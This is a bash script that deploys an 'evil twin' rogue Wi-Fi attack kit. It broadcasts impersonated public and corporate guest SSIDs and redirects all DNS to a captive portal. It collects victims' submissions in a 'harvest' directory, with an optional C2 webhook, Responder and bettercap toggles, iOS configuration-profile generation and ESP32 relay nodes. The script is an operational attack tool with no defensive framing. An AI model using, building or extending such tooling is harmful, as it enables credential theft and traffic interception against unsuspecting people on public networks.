#!/bin/bash
# Shadow Evil Twin Ultra v3.7 - Production Modular Suite (Reaper Rebuild)
set -euo pipefail

echo "=== Shadow Evil Twin Ultra v3.7 [Reaper Edition] ==="

CONFIG_FILE="${1:-shadow.conf}"
if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "Error: $CONFIG_FILE not found. cp shadow.conf.example $CONFIG_FILE && edit."
    exit 1
fi

# Robust INI parser
declare -A CONFIG
while IFS='=' read -r key val || [[ -n "$key" ]]; do
    key=$(echo "$key" | xargs)
    val=$(echo "$val" | xargs)
    [[ -z "$key" || "$key" =~ ^# || "$key" =~ ^\[ ]] && continue
    CONFIG["$key"]="$val"
done < "$CONFIG_FILE"

# Extract SSIDs
IFS=',' read -ra SSID_ARRAY <<< "${CONFIG[names]:-BostonFreePublicWiFi,StateStreet_Guest}"
SSID1="${SSID_ARRAY[0]}"
SSID2="${SSID_ARRAY[1]:-${SSID_ARRAY[0]}-Guest}"

IFACE="${CONFIG[interface]:-wlan1}"
PORTAL_IP="${CONFIG[portal_ip]:-10.0.0.1}"
C2_URL="${CONFIG[webhook_url]:-}"
MONITOR_PASS="${CONFIG[password]:-shadow2026}"
ENABLE_MOBILECONFIG="${CONFIG[mobileconfig]:-true}"
ENABLE_RESPONDER="${CONFIG[responder]:-false}"
ENABLE_BETTERCAP="${CONFIG[bettercap]:-false}"
ENABLE_ESP32_MESH="${CONFIG[esp32_mesh]:-true}"
ENABLE_NAT="${CONFIG[enable_nat]:-true}"
NAT_INTERFACE="${CONFIG[nat_interface]:-usb0}"

echo "[+] IFACE=$IFACE | Portal=$PORTAL_IP | SSIDs=$SSID1,$SSID2 | C2=${C2_URL:-None} | NAT=$ENABLE_NAT"

# Prep interface
sudo ip link set "$IFACE" down 2>/dev/null || true
sudo ip addr flush dev "$IFACE" 2>/dev/null || true
sudo ip addr add "$PORTAL_IP/24" dev "$IFACE"
sudo ip link set "$IFACE" up

# Hostapd (multi-SSID)
mkdir -p /etc/hostapd
cat > /etc/hostapd/hostapd.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$SSID1
hw_mode=g
channel=6
tx_power=20
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
if [ -n "$SSID2" ]; then
    cat >> /etc/hostapd/hostapd.conf << EOF
bss=$IFACE:1
ssid=$SSID2
EOF
fi

# dnsmasq
mkdir -p /var/lib/misc
cat > /etc/dnsmasq.conf << EOF
interface=$IFACE
dhcp-range=10.0.0.50,10.0.0.150,12h
address=/#/10.0.0.1
dhcp-leasefile=/var/lib/misc/dnsmasq-shadow.leases
EOF

# Portal setup (nginx + PHP)
sudo mkdir -p /var/www/html/uploads /var/www/html/assets/js
sudo cp -r portal/* /var/www/html/ 2>/dev/null || true
sudo chown -R www-data:www-data /var/www/html

# NAT
if [ "$ENABLE_NAT" = "true" ]; then
    sudo sysctl -w net.ipv4.ip_forward=1
    sudo iptables -t nat -F
    sudo iptables -t nat -A POSTROUTING -o "$NAT_INTERFACE" -j MASQUERADE
fi

# Services
sudo systemctl restart dnsmasq nginx php*-fpm 2>/dev/null || true
sudo systemctl enable --now dnsmasq nginx 2>/dev/null || true

# Generate helpers
cat > /root/start-evil.sh << 'EOF'
#!/bin/bash
# Auto-generated
IFACE="'"$IFACE"'"
EOF
# ... (append toggles, bettercap/responder calls)

cat > /root/stop-evil.sh << EOF
#!/bin/bash
sudo systemctl stop hostapd dnsmasq nginx
sudo pkill -f bettercap || true
sudo pkill -f responder || true
sudo ip addr flush dev $IFACE
echo "[+] Stopped. Run ./cleanup.sh for full reset."
EOF
chmod +x /root/start-evil.sh /root/stop-evil.sh

if [ "$ENABLE_MOBILECONFIG" = "true" ]; then
    scripts/mobileconfig/generate.sh
fi
if [ "$ENABLE_ESP32_MESH" = "true" ]; then
    scripts/esp32/generate.sh --ssids "$SSID1,$SSID2" --main-ip "$PORTAL_IP" --nodes 4
fi

echo "=== DEPLOY COMPLETE ==="
echo "Start: sudo /root/start-evil.sh"
echo "Monitor: http://$PORTAL_IP/admin-monitor.php ?pw=$MONITOR_PASS"
echo "Password: $MONITOR_PASS"
echo "Harvest dir: /var/www/html/uploads"
